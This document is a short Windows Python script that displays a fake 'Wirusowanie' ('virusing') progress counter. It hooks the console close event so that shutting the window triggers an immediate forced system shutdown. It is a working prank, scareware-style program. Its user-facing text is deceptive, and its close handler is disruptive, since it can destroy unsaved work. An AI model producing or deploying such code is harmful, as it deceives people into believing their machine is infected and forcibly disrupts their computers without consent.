
import os

def bye():
    os.system('cmd /k "shutdown /s /t 0"')

def on_exit(signal_type):
    if signal_type==2:
        bye()

import win32api
win32api.SetConsoleCtrlHandler(on_exit, True)

i=0
while True:
    print("Wirusowanie "+str(float(i)/1000)+"%")
    i+= 1